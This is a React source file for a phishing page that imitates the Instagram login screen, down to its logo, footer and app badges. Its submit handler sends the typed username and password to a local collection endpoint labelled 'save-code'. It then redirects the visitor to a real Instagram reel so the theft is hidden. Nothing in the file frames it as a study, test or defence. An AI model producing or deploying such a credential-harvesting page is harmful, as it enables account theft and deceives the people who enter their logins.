/** @format */

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import InstagramLogo from "@/components/InstagramLogo";

const Index = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [status, setStatus] = useState("");

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setStatus("sending...");
    try {
      const res = await fetch("http://localhost:5000/save-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, code: password }),
      });
      if (!res.ok) throw new Error("server error");
      setStatus("saved");
      setEmail("");
      setPassword("");
      window.location.href =
        "https://www.instagram.com/reel/DQ68TUvDO60/?igsh=MWc1dGdub2dqYzZsYQ==";
    } catch {
      setStatus("error");
    }
  }

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[350px]">
        {/* Language Selector */}
        <div className="mb-8 flex justify-center">
          <Select defaultValue="en-us">
            <SelectTrigger className="w-[140px] border-border bg-transparent text-muted-foreground text-xs">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="en-us">English (US)</SelectItem>
              <SelectItem value="es">Español</SelectItem>
              <SelectItem value="fr">Français</SelectItem>
              <SelectItem value="de">Deutsch</SelectItem>
            </SelectContent>
          </Select>
        </div>

        {/* Login Card */}
        <div className="bg-card border border-border rounded-sm p-10 mb-2.5">
          <InstagramLogo />

          <form onSubmit={handleSubmit} className="space-y-2">
            <Input
              type="text"
              placeholder="Username, email or mobile number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="bg-background border-border text-xs h-10 px-2 rounded-[3px]"
            />
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="bg-background border-border text-xs h-10 px-2 rounded-[3px]"
            />
            <Button
              type="submit"
              className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold rounded-lg h-8 text-sm mt-4"
            >
              Log in
            </Button>
          </form>

          <div className="flex items-center gap-5 my-6">
            <div className="flex-1 h-[1px] bg-border"></div>
            <span className="text-[13px] text-muted-foreground font-semibold">
              OR
            </span>
            <div className="flex-1 h-[1px] bg-border"></div>
          </div>

          <button className="w-full text-center text-instagram-blue font-semibold text-[14px] hover:text-instagram-blue/80 mb-5">
            Log in with Facebook
          </button>

          <button className="w-full text-center text-xs text-instagram-link hover:text-instagram-link/80">
            Forgot password?
          </button>
        </div>

        {/* Sign Up Card */}
        <div className="bg-card border border-border rounded-sm p-5 text-center">
          <p className="text-sm text-foreground">
            Don't have an account?{" "}
            <a
              href="#"
              className="text-primary font-semibold hover:text-primary/80"
            >
              Sign up
            </a>
          </p>
        </div>

        {/* Create Account Button */}
        <div className="mt-3">
          <Button
            variant="outline"
            className="w-full border-primary text-primary hover:bg-primary/5 font-semibold rounded-lg h-9 text-sm"
          >
            Create new account
          </Button>
        </div>

        {/* Get the app */}
        <div className="mt-6 text-center">
          <p className="text-sm text-foreground mb-5">Get the app.</p>
          <div className="flex justify-center gap-2">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              alt="Get it on Google Play"
              className="h-10"
            />
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              alt="Get it from Microsoft"
              className="h-10"
            />
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="mt-16 w-full max-w-[935px]">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-muted-foreground mb-4">
          <a href="#" className="hover:underline">
            Meta
          </a>
          <a href="#" className="hover:underline">
            About
          </a>
          <a href="#" className="hover:underline">
            Blog
          </a>
          <a href="#" className="hover:underline">
            Jobs
          </a>
          <a href="#" className="hover:underline">
            Help
          </a>
          <a href="#" className="hover:underline">
            API
          </a>
          <a href="#" className="hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:underline">
            Terms
          </a>
          <a href="#" className="hover:underline">
            Locations
          </a>
          <a href="#" className="hover:underline">
            Instagram Lite
          </a>
          <a href="#" className="hover:underline">
            Threads
          </a>
          <a href="#" className="hover:underline">
            Contact Uploading & Non-Users
          </a>
          <a href="#" className="hover:underline">
            Meta Verified
          </a>
        </div>
        <div className="flex justify-center gap-4 text-xs text-muted-foreground">
          <span>English (US)</span>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default Index;
